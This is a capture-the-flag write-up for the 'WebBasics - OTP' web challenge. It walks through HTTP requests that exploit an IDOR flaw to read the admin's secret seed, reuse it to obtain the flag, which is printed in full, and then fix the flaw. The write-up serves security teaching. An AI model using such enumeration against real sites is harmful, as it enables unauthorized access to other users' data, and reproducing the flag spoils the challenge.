# WebBasics - OTP

| Field       | Value                                          |
| ----------- | ---------------------------------------------- |
| **Category** | Web                                           |
| **Points**  | 100                                            |
| **URL**     | `http://exp.cybergame.sk:7020`                 |
| **Flag**    | `SK-CERT{y0u_h4v3_f0und_4dmin_s3cr37_70k3n}`   |

---

## Description

> There is a highly secure, certified, and visually beautiful application for generating daily tokens from secret seeds. But only one seed can generate the flag….

---

## Summary

The application had an **Insecure Direct Object Reference (IDOR)** vulnerability on the `/profile/{id}` endpoint. Any authenticated user could access **any other user's profile** by simply incrementing the ID in the URL — including the admin's profile at `/profile/1`. This exposed the admin's `secret_initializator`, which when applied to our own account, caused the dashboard to generate the flag as our daily token.

---

## Vulnerability

**IDOR (CWE-639)** — The application used sequential integer IDs for user profiles (`/profile/1`, `/profile/2`, …) and never verified that the requesting user owned the profile they were accessing.

---

## Walkthrough

### Step 1 — Recon

The site presented a simple Flask-based web application with three visible endpoints:

- `/` — Token dashboard (requires login)
- `/login` — Login page
- `/register` — Registration page

We registered a new account and logged in:

```http
POST /register
username=h4ck3r&password=h4ck_th1s!
→ 302 Found → /login

POST /login
username=h4ck3r&password=h4ck_th1s!
→ 302 Found → /
```

### Step 2 — Authenticated Dashboard

After logging in, the dashboard displayed a "Today Token" — a 64-character hex string. A link labeled **"Configure secret settings"** pointed to `/profile/{id}` (our ID was `47`):

```html
<div class="card-panel grey lighten-4">
  54db65c2e04315af36076b30fc29d784f621afe5a5155a550e56ab0dd7263455
</div>
<a href="/profile/47">Configure secret settings</a>
```

### Step 3 — Profile Page

The profile page (`/profile/47`) revealed three fields:

| Field                 | Value            |
| --------------------- | ---------------- |
| Username              | `h4ck3r`         |
| Password              | `********`       |
| Secret Initializator  | `default_secret` |

The page also had a form to update the password and the secret initializator.

### Step 4 — IDOR Enumeration

The profile URL used a numeric ID. Testing other IDs revealed we could access **any user's profile**:

```http
GET /profile/1
HTTP/1.1 200 OK
```

Response for `/profile/1` contained:

```html
<li><strong>Username:</strong> <span>admin</span></li>
<li><strong>Secret Initializator:</strong>
  <span>a95aa045a8bf5e502ee2541dd2a00925e2e825eacbbc22dadfb4ba027094dbf0</span>
</li>
```

The admin's secret initializator was `a95aa045a8bf5e502ee2541dd2a00925e2e825eacbbc22dadfb4ba027094dbf0`.

Profiles were grouped into two categories:
- Most profiles had `default_secret` (regular users)
- Several profiles (`1`, `2`, `3`, `13`, `42`) shared the same 64-char hex secret — this was the admin seed

### Step 5 — Exploitation

We updated our own profile to use the admin's secret initializator:

```http
POST /profile/47
secret_init=a95aa045a8bf5e502ee2541dd2a00925e2e825eacbbc22dadfb4ba027094dbf0
→ 302 Found
```

### Step 6 — Flag

After refreshing the dashboard, the token was now generated using the admin's secret. The dashboard displayed a green panel with the flag:

```html
<div class="card-panel green darken-3">
  SK-CERT{y0u_h4v3_f0und_4dmin_s3cr37_70k3n}
</div>
```

---

## How the Application Worked

The application generated a daily token by hashing the combination of the current date and the user's `secret_initializator`:

```
token = sha256(current_date + secret_initializator)
```

- Users with `default_secret` got a common, uninteresting token
- The **admin's seed** was the only one that, when used, would trigger the application to render the flag instead of a normal token

---

## Remediation

| Issue                        | Fix                                                                 |
| ---------------------------- | ------------------------------------------------------------------- |
| **IDOR on `/profile/{id}`**  | Check that `session['user_id'] == profile_id` before rendering      |
| **Sequential user IDs**      | Use UUIDs or non-guessable identifiers                              |
| **Admin seed exposure**      | Never expose secrets in profile views; admin profiles should be hidden or restricted |
| **No authorization checks**  | Implement role-based access control (RBAC) on sensitive endpoints   |
